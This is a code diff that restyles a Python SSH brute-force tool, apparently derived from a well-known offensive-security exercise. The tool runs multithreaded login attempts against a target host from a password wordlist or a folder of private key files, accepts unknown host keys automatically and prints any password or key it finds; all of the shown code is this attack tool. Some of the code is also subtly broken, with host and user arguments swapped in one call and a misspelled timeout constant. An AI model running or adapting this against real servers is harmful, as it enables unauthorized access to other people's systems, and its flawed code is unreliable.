@@ -25,7 +25,7 @@ def connect_with_passwd(host, user, passwd, release):
     global Found, Fails, PASSWD
     s = None
     try:
-        s = pxssh.pxssh(options={'Ciphers':CIPHERS})
+        s = pxssh.pxssh(options={'Ciphers': CIPHERS})
         s.login(host, user, passwd)
         PASSWD = passwd
         Found = True
@@ -33,14 +33,14 @@ def connect_with_passwd(host, user, passwd, release):
     except Exception as e:
         # 出现错误 s置为空
         if 'read_nonblocking' in str(e):
-            Fails+=1
+            Fails += 1
             time.sleep(5)
-            connect_with_passwd(host,user,passwd,False)
+            connect_with_passwd(host, user, passwd, False)
         elif 'synchronize with original prompt' in str(e):
             time.sleep(1)
-            connect_with_passwd(host,user,passwd,False)
+            connect_with_passwd(host, user, passwd, False)
         elif 'Could not establish connection to host' in str(e):
-            Fails+=1
+            Fails += 1
             time.sleep(2)
     finally:
         if s:
@@ -58,20 +58,20 @@ def connect_with_key(user, host, keyfile, release):
         ssh_newkey = 'Are you sure you want to continue'
         conn_closed = 'Connection closed by remote host'
         opt = '-o PasswordAuthentication=no'
-        connStr = 'ssh '+user+'@'+host+' -i '+keyfile+opt
-        child = pexpect.spawn(connStr)
+        connect_str = 'ssh '+user+'@'+host+' -i '+keyfile+opt
+        child = pexpect.spawn(connect_str)
         ret = child.expect([pexpect.TMEOUT, perm_denied, ssh_newkey, conn_closed, '$', '#'])
-        if ret==0 or ret==1:
+        if ret == 0 or ret == 1:
             # print('[-] Connect Failed.Time out error.')
-            Fails+=1
-        elif ret==2:
+            Fails += 1
+        elif ret == 2:
             # print('[-] Adding Host to !/.ssh/known_hosts')
             child.sendline('yes')
-            connect_with_key(user,host,keyfile,False)
-        elif ret==3:
+            connect_with_key(user, host, keyfile, False)
+        elif ret == 3:
             # print('[-] Connection Closed By Remote Host')
-            Fails+=1
-        elif ret>3:
+            Fails += 1
+        elif ret > 3:
             # print('[+] Success. '+str(keyfile))
             KEYFILE = str(keyfile)
             Found = True
@@ -80,18 +80,18 @@ def connect_with_key(user, host, keyfile, release):
             CONNECTION_LOCK.release()
 
 
-def ssh_key(user, host, passDir):
+def ssh_key(user, host, key_dir):
     global Found
     global Fails
     threads = []
-    for filename in os.listdir(passDir):
+    for filename in os.listdir(key_dir):
         if Found:
             break
         if Fails > FAIL_LIMIT:
             break
-        fullpath = os.path.join(passDir,filename)
+        fullpath = os.path.join(key_dir, filename)
         print('[*] Testing keyfile '+str(fullpath))
-        t = Thread(target=connect_with_key,args=(user,host,fullpath,True))
+        t = Thread(target=connect_with_key, args=(user, host, fullpath, True))
         t.setDaemon(True)
         threads.append(t)
         t.start()
@@ -100,15 +100,15 @@ def ssh_key(user, host, passDir):
             t.join()
 
 
-def ssh_pass(host, user, passwdFile):
+def ssh_pass(host, user, passwd_file):
     global Found
     global Fails
     threads = []
-    fn = open(passwdFile, 'r')
+    fn = open(passwd_file, 'r')
     for line in fn.readlines():
         if Found:
             break
-        if Fails>FAIL_LIMIT:
+        if Fails > FAIL_LIMIT:
             break
         CONNECTION_LOCK.acquire()
         passwd = line.strip('\r').strip('\n')
@@ -131,23 +131,23 @@ def reset():
     PASSWD = None
 
 
-def bruteSSH(host, user, *, passKeyDir=None, passwdFile=None, maxConnection=None):
-    if passKeyDir is None and passwdFile is None:
+def brute_ssh(host, user, *, pass_key_dir=None, passwd_file=None, max_connection=None):
+    if pass_key_dir is None and passwd_file is None:
         print('[-] Wrong parameters.')
 
     global MAX_CONNECTION, CONNECTION_LOCK
     global Found, Fails
     global PASSWD, KEYFILE
 
-    if maxConnection != 10 and maxConnection is not None and maxConnection != '':
-        MAX_CONNECTION = int(maxConnection)
+    if max_connection != 10 and max_connection is not None and max_connection != '':
+        MAX_CONNECTION = int(max_connection)
         CONNECTION_LOCK = BoundedSemaphore(value=MAX_CONNECTION)
     ret = {'ip': host, 'user': user, 'type': None, 'key': None}
-    if passKeyDir:
-        ssh_key(host, user, passKeyDir)
+    if pass_key_dir:
+        ssh_key(host, user, pass_key_dir)
         if Found:
             print('[+] Keyfile Found: '+KEYFILE)
-        elif Fails>FAIL_LIMIT:
+        elif Fails > FAIL_LIMIT:
             print('[-] Exiting: Too Many Connections Closed By Remote Host.')
             print('[-] Adjust number of simultaneous threads.')
         else:
@@ -156,8 +156,8 @@ def bruteSSH(host, user, *, passKeyDir=None, passwdFile=None, maxConnection=None
         ret['key'] = KEYFILE
         reset()
         return ret
-    elif passwdFile:
-        ssh_pass(host, user, passwdFile)
+    elif passwd_file:
+        ssh_pass(host, user, passwd_file)
         if Found:
             print('[+] '+host+'\'s Password Found: '+PASSWD)
         elif Fails > FAIL_LIMIT:
@@ -180,22 +180,22 @@ def main():
     parser.add_option('--maxc', dest='maxConnection', type='string', help='specify the max connections')
     (options, args) = parser.parse_args()
     host = options.tgtHost
-    passwdFile = options.passwdFile
-    passKeyDir = options.passKeyDir
+    passwd_file = options.passwdFile
+    pass_key_dir = options.passKeyDir
     user = options.user
-    maxConnection = options.maxConnection
+    max_connection = options.maxConnection
 
-    if host is None or (passwdFile is None and passKeyDir is None) or user is None:
+    if host is None or (passwd_file is None and pass_key_dir is None) or user is None:
         print(parser.usage)
         exit(0)
 
     try:
-        bruteSSH(host, user, passwdFile=passwdFile, passKeyDir=passKeyDir, maxConnection=maxConnection)
+        brute_ssh(host, user, passwd_file=passwd_file, pass_key_dir=pass_key_dir, max_connection=max_connection)
     except KeyboardInterrupt:
         pass
     except Exception as e:
         print('[-]', e)
 
 
-if __name__=="__main__":
+if __name__ == "__main__":
     main()
